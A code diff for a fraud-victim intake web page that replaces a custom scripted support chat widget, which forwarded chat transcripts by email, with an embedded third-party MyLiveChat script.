@@ -302,9 +302,7 @@ textarea:invalid:not(:placeholder-shown){border-color:rgba(239,68,68,.6)}
 }
 .consent label{margin:0;font-weight:500;font-size:.85rem;color:#334155;line-height:1.55;cursor:pointer}
 
-/* ---------- NATIVE CONSENT CHECKBOX ----------
-   Restores the browser's default checkbox so it renders
-   with the standard check mark. Does not block submission. */
+/* ---------- NATIVE CONSENT CHECKBOX ---------- */
 .consent input[type="checkbox"]{
   -webkit-appearance:auto;
   appearance:auto;
@@ -374,136 +372,6 @@ footer .wrap{display:grid;gap:1.1rem}
 .footer-bottom{
   display:flex;flex-wrap:wrap;gap:.8rem;justify-content:space-between;
   padding-top:1.1rem;border-top:1px solid var(--line-2);font-size:.78rem;
-}
-
-/* ============================================================
-   LIVE CHAT
-   ============================================================ */
-.chat-launcher{
-  position:fixed;right:22px;bottom:22px;z-index:80;
-  width:62px;height:62px;border-radius:50%;border:none;cursor:pointer;
-  color:#fff;display:grid;place-items:center;
-  background:linear-gradient(135deg,#2563eb,#0891b2);
-  box-shadow:0 22px 44px -14px rgba(37,99,235,.85);
-  transition:transform .2s,box-shadow .25s;
-}
-.chat-launcher:hover{transform:translateY(-3px) scale(1.03);box-shadow:0 26px 50px -14px rgba(37,99,235,1)}
-.chat-launcher::after{
-  content:"";position:absolute;inset:-6px;border-radius:50%;
-  border:2px solid rgba(37,99,235,.4);
-  animation:ring 2.8s ease-out infinite;
-  pointer-events:none;
-}
-@keyframes ring{
-  0%{transform:scale(.9);opacity:.9}
-  70%{transform:scale(1.28);opacity:0}
-  100%{opacity:0}
-}
-.chat-launcher .icon-close{display:none}
-.chat-launcher.is-open .icon-chat{display:none}
-.chat-launcher.is-open .icon-close{display:block}
-.chat-launcher.is-open::after{display:none}
-.chat-badge{
-  position:absolute;top:-2px;right:-2px;width:20px;height:20px;border-radius:50%;
-  background:var(--ok);color:#fff;font-size:.66rem;font-weight:800;
-  display:grid;place-items:center;border:2px solid #fff;
-}
-.chat-launcher.is-open .chat-badge{display:none}
-
-.chat-panel{
-  position:fixed;right:22px;bottom:96px;z-index:81;
-  width:min(376px,calc(100vw - 32px));
-  height:min(580px,calc(100vh - 140px));
-  background:#fff;border-radius:22px;overflow:hidden;
-  display:flex;flex-direction:column;
-  border:1px solid #e6eefc;
-  box-shadow:0 50px 100px -35px rgba(15,42,90,.55);
-  opacity:0;transform:translateY(18px) scale(.97);pointer-events:none;
-  transition:opacity .25s,transform .28s cubic-bezier(.2,.8,.3,1);
-}
-.chat-panel.open{opacity:1;transform:translateY(0) scale(1);pointer-events:auto}
-
-.chat-head{
-  display:flex;align-items:center;gap:.75rem;padding:.95rem 1rem;
-  background:linear-gradient(135deg,#1d4ed8,#2563eb 55%,#0891b2);
-  color:#fff;flex:0 0 auto;
-}
-.chat-avatar{
-  width:40px;height:40px;border-radius:13px;flex:0 0 40px;
-  display:grid;place-items:center;
-  background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.28);
-}
-.chat-head h3{margin:0;font-size:.93rem;font-weight:800;letter-spacing:-.01em}
-.chat-head p{margin:0;font-size:.72rem;opacity:.9;display:flex;align-items:center;gap:.35rem}
-.chat-head .dot{width:7px;height:7px;border-radius:50%;background:#4ade80}
-.chat-close{
-  margin-left:auto;width:32px;height:32px;border-radius:9px;border:none;cursor:pointer;
-  background:rgba(255,255,255,.15);color:#fff;display:grid;place-items:center;
-  transition:background .18s;
-}
-.chat-close:hover{background:rgba(255,255,255,.28)}
-
-.chat-body{
-  flex:1;overflow-y:auto;padding:1.1rem;
-  display:flex;flex-direction:column;gap:.7rem;background:#f8fbff;
-  scrollbar-width:thin;
-}
-.chat-body::-webkit-scrollbar{width:6px}
-.chat-body::-webkit-scrollbar-thumb{background:#dbeafe;border-radius:99px}
-
-.msg{display:flex;animation:msgIn .25s ease both}
-@keyframes msgIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
-.msg.user{justify-content:flex-end}
-.bubble{
-  max-width:84%;padding:.66rem .92rem;border-radius:16px;
-  font-size:.88rem;line-height:1.52;white-space:pre-line;word-break:break-word;
-}
-.msg.bot .bubble{
-  background:#fff;border:1px solid #e6eefc;color:#1e293b;
-  border-bottom-left-radius:6px;box-shadow:0 6px 14px -12px rgba(15,42,90,.5);
-}
-.msg.user .bubble{
-  background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;
-  border-bottom-right-radius:6px;box-shadow:0 10px 20px -14px rgba(37,99,235,.9);
-}
-.typing .bubble{display:flex;gap:4px;align-items:center;padding:.8rem .95rem}
-.tdot{width:6px;height:6px;border-radius:50%;background:#94a3b8;animation:blink 1.2s infinite}
-.tdot:nth-child(2){animation-delay:.15s}
-.tdot:nth-child(3){animation-delay:.3s}
-@keyframes blink{0%,80%,100%{opacity:.25;transform:translateY(0)}40%{opacity:1;transform:translateY(-2px)}}
-
-.chat-quick{
-  display:flex;flex-wrap:wrap;gap:.45rem;
-  padding:.1rem 1rem .7rem;background:#f8fbff;flex:0 0 auto;
-}
-.chat-quick.empty{display:none}
-.quick{
-  font-family:inherit;font-size:.78rem;font-weight:700;
-  color:var(--blue-700);background:#eff6ff;border:1px solid #dbeafe;
-  border-radius:999px;padding:.42rem .78rem;cursor:pointer;
-  transition:background .15s,transform .15s;
-}
-.quick:hover{background:#dbeafe;transform:translateY(-1px)}
-
-.chat-input{
-  display:flex;gap:.5rem;padding:.7rem;
-  border-top:1px solid var(--line-2);background:#fff;flex:0 0 auto;
-}
-.chat-input input{
-  flex:1;border-radius:12px;background:#f8fafc;padding:.68rem .85rem;font-size:.88rem;
-}
-.chat-send{
-  width:44px;height:44px;flex:0 0 44px;border-radius:12px;border:none;cursor:pointer;
-  color:#fff;display:grid;place-items:center;
-  background:linear-gradient(135deg,#2563eb,#1d4ed8);
-  transition:transform .15s,box-shadow .2s;
-  box-shadow:0 12px 22px -12px rgba(37,99,235,.9);
-}
-.chat-send:hover{transform:translateY(-1px)}
-
-@media(max-width:520px){
-  .chat-panel{right:12px;bottom:88px;width:calc(100vw - 24px);height:min(560px,calc(100vh - 120px))}
-  .chat-launcher{right:16px;bottom:16px}
 }
 
 @media (prefers-reduced-motion:reduce){
@@ -809,45 +677,6 @@ footer .wrap{display:grid;gap:1.1rem}
   </div>
 </footer>
 
-<!-- ============================ LIVE CHAT ============================ -->
-<button class="chat-launcher" id="chatLauncher" type="button" aria-label="Open live support chat" aria-expanded="false">
-  <svg class="icon-chat" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M21 11.5a8.4 8.4 0 0 1-9 8.4 9.4 9.4 0 0 1-4.2-1L3 20l1.1-4.6A8.4 8.4 0 0 1 12 3.1a8.4 8.4 0 0 1 9 8.4z"/>
-    <path d="M8.5 11.5h.01M12 11.5h.01M15.5 11.5h.01"/>
-  </svg>
-  <svg class="icon-close" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
-    <path d="M18 6 6 18M6 6l12 12"/>
-  </svg>
-  <span class="chat-badge">1</span>
-</button>
-
-<div class="chat-panel" id="chatPanel" role="dialog" aria-label="Live support chat" aria-modal="false">
-  <div class="chat-head">
-    <div class="chat-avatar" aria-hidden="true">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M12 2 20 5v6c0 5.3-3.6 9.1-8 11-4.4-1.9-8-5.7-8-11V5z"/><path d="m8.5 12 2.5 2.5 4.5-5"/>
-      </svg>
-    </div>
-    <div>
-      <h3>Intake Assistant</h3>
-      <p><span class="dot" aria-hidden="true"></span> Online · usually replies instantly</p>
-    </div>
-    <button class="chat-close" id="chatClose" type="button" aria-label="Close chat">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
-    </button>
-  </div>
-
-  <div class="chat-body" id="chatBody"></div>
-  <div class="chat-quick" id="chatQuick"></div>
-
-  <form class="chat-input" id="chatForm">
-    <input id="chatInput" type="text" placeholder="Type a message…" autocomplete="off" aria-label="Chat message">
-    <button class="chat-send" type="submit" aria-label="Send message">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2 11 13"/><path d="M22 2 15 22l-4-9-9-4z"/></svg>
-    </button>
-  </form>
-</div>
-
 <!-- ============================ EMAILJS ============================ -->
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 
@@ -945,238 +774,30 @@ form.addEventListener('submit', function (e) {
 });
 
 /* =========================================================
-   LIVE CHAT
+   LIVE CHAT — MyLiveChat
+   The chat widget is injected by the script tag placed just
+   before </body>. This handler wires the hero button to it.
    ========================================================= */
-const chatEls = {
-  launcher: document.getElementById('chatLauncher'),
-  panel:    document.getElementById('chatPanel'),
-  close:    document.getElementById('chatClose'),
-  body:     document.getElementById('chatBody'),
-  quick:    document.getElementById('chatQuick'),
-  form:     document.getElementById('chatForm'),
-  input:    document.getElementById('chatInput')
-};
-
-let chatOpen   = false;
-let greeted    = false;
-let chatStep   = 'start';
-let chatEmail  = null;
-let transcript = [];
-const chatRef  = generateRef('CHAT');
-
-/* ---------- open / close ---------- */
-function setChat(open) {
-  chatOpen = open;
-  chatEls.panel.classList.toggle('open', open);
-  chatEls.launcher.classList.toggle('is-open', open);
-  chatEls.launcher.setAttribute('aria-expanded', String(open));
-  if (open) {
-    setTimeout(() => chatEls.input.focus(), 260);
-    scrollChat();
-  }
-}
-chatEls.launcher.addEventListener('click', () => {
-  setChat(!chatOpen);
-  if (chatOpen) startChat();
-});
-chatEls.close.addEventListener('click', () => setChat(false));
-document.addEventListener('keydown', e => {
-  if (e.key === 'Escape' && chatOpen) setChat(false);
-});
-document.getElementById('heroChatBtn').addEventListener('click', () => {
-  setChat(true);
-  startChat();
-});
-
-/* ---------- rendering ---------- */
-function scrollChat() {
-  chatEls.body.scrollTop = chatEls.body.scrollHeight;
-}
-
-function pushMsg(role, text) {
-  const row = document.createElement('div');
-  row.className = 'msg ' + role;
-
-  const bubble = document.createElement('div');
-  bubble.className = 'bubble';
-  bubble.textContent = text;
-
-  row.appendChild(bubble);
-  chatEls.body.appendChild(row);
-
-  transcript.push((role === 'bot' ? 'Assistant: ' : 'Visitor: ') + text);
-  scrollChat();
-}
-
-let typingEl = null;
-function setTyping(on) {
-  if (on) {
-    if (typingEl) return;
-    typingEl = document.createElement('div');
-    typingEl.className = 'msg bot typing';
-    typingEl.innerHTML =
-      '<div class="bubble"><span class="tdot"></span><span class="tdot"></span><span class="tdot"></span></div>';
-    chatEls.body.appendChild(typingEl);
-    scrollChat();
-  } else if (typingEl) {
-    typingEl.remove();
-    typingEl = null;
-  }
-}
-
-function botSay(text, delay = 700) {
-  setTyping(true);
-  setTimeout(() => {
-    setTyping(false);
-    pushMsg('bot', text);
-  }, delay);
-}
-
-function setQuick(list) {
-  chatEls.quick.innerHTML = '';
-  list.forEach(item => {
-    const b = document.createElement('button');
-    b.type = 'button';
-    b.className = 'quick';
-    b.textContent = item.label;
-    b.addEventListener('click', item.action);
-    chatEls.quick.appendChild(b);
-  });
-  chatEls.quick.classList.toggle('empty', list.length === 0);
-  scrollChat();
-}
-
-/* ---------- conversation actions ---------- */
-function goToForm() {
-  pushMsg('user', 'Open the form');
-  botSay('Opening the confidential intake form — it takes about 3 minutes to complete.');
-  document.getElementById('report').scrollIntoView({ behavior: 'smooth' });
-  setTimeout(() => setChat(false), 900);
-  setQuick([
-    { label: 'Talk to a human', action: askHuman }
-  ]);
-}
-
-function askHuman() {
-  pushMsg('user', 'Talk to a human');
-  botSay("Of course. What's the best email address to reach you? I'll forward this conversation to our response team.");
-  chatStep = 'await_email';
-  chatEls.input.placeholder = 'Type your email address…';
-  setQuick([]);
-}
-
-function menu() {
-  chatStep = 'start';
-  chatEls.input.placeholder = 'Type a message…';
-  setQuick([
-    {
-      label: "I've been scammed",
-      action: () => {
-        pushMsg('user', "I've been scammed");
-        botSay("I'm sorry that happened to you — you're in the right place. Open the confidential intake form and describe what happened. Include dates, amounts, and any contact details the scammer used. A case analyst will review it.");
-        setQuick([
-          { label: 'Open the form', action: goToForm },
-          { label: 'Talk to a human', action: askHuman },
-          { label: 'Back to menu', action: menu }
-        ]);
-      }
-    },
-    {
-      label: 'How does it work?',
-      action: () => {
-        pushMsg('user', 'How does it work?');
-        botSay("It's simple:\n1) Submit the intake form with your story.\n2) You receive a case reference.\n3) An analyst reviews your details.\n4) We contact you with next steps and reporting guidance.");
-        setQuick([
-          { label: 'Open the form', action: goToForm },
-          { label: 'Talk to a human', action: askHuman },
-          { label: 'Back to menu', action: menu }
-        ]);
-      }
-    },
-    {
-      label: 'Is it free?',
-      action: () => {
-        pushMsg('user', 'Is it free?');
-        botSay('Yes — reporting through this portal is completely free. We never ask for payment, passwords, or one-time codes.');
-        setQuick([
-          { label: 'Open the form', action: goToForm },
-          { label: 'Talk to a human', action: askHuman },
-          { label: 'Back to menu', action: menu }
-        ]);
-      }
-    },
-    { label: 'Talk to a human', action: askHuman }
-  ]);
-}
-
-function startChat() {
-  if (greeted) return;
-  greeted = true;
-  botSay("Hi there 👋 Welcome to the Fraud Victim Intake desk. I'm your intake assistant — how can I help you today?", 500);
-  setTimeout(menu, 1150);
-}
-
-/* ---------- chat input ---------- */
-chatEls.form.addEventListener('submit', e => {
-  e.preventDefault();
-  const val = chatEls.input.value.trim();
-  if (!val) return;
-
-  chatEls.input.value = '';
-  pushMsg('user', val);
-
-  /* ---- awaiting an email address ---- */
-  if (chatStep === 'await_email') {
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
-      botSay("That doesn't look like a valid email address. Could you check and type it again?");
+document.getElementById('heroChatBtn').addEventListener('click', function () {
+  try {
+    if (typeof window.MyLiveChat_OpenChatBox === 'function') {
+      window.MyLiveChat_OpenChatBox();
       return;
     }
-
-    chatEmail = val;
-    chatStep  = 'start';
-    chatEls.input.placeholder = 'Type a message…';
-    setTyping(true);
-
-    emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-      to_email:     RECIPIENT_EMAIL,
-      from_name:    'Live Chat Visitor',
-      reply_to:     chatEmail,
-      reference_id: chatRef,
-      scam_type:    'Live Chat Enquiry',
-      country:      '—',
-      message:      transcript.join('\n')
-    }).then(() => {
-      setTyping(false);
-      pushMsg('bot',
-        'Thank you — your conversation has been forwarded to our response team. ' +
-        'Your chat reference is ' + chatRef + '. An analyst will contact you at ' +
-        chatEmail + ' within 24 hours.'
-      );
-      setQuick([
-        { label: 'Open the form', action: goToForm },
-        { label: 'Back to menu', action: menu }
-      ]);
-    }).catch(err => {
-      console.error('Chat EmailJS error:', err);
-      setTyping(false);
-      pushMsg('bot',
-        "I couldn't forward that automatically right now. Please submit the intake form, " +
-        'or email us directly at ' + RECIPIENT_EMAIL + '.'
-      );
-      setQuick([{ label: 'Open the form', action: goToForm }]);
-    });
-    return;
+    if (typeof window.MyLiveChat_StartChat === 'function') {
+      window.MyLiveChat_StartChat();
+      return;
+    }
+  } catch (err) {
+    /* fall through to the form */
   }
-
-  /* ---- generic fallback ---- */
-  botSay('Thanks for sharing that. The fastest way to get help is the confidential intake form — our analysts review every submission.', 750);
-  setQuick([
-    { label: 'Open the form', action: goToForm },
-    { label: 'Talk to a human', action: askHuman },
-    { label: 'Back to menu', action: menu }
-  ]);
+  document.getElementById('report').scrollIntoView({ behavior: 'smooth' });
 });
 </script>
+
+<!-- ============================ LIVE CHAT (MyLiveChat) ============================ -->
+<!--Add the following script at the bottom of the web page (before </body></html>)-->
+<script type="text/javascript" async="async" defer="defer" data-cfasync="false" referrerpolicy="origin" src="https://www.mylivechat.com/chatbutton.aspx?hccid=10962436"></script>
 
 </body>
 </html>
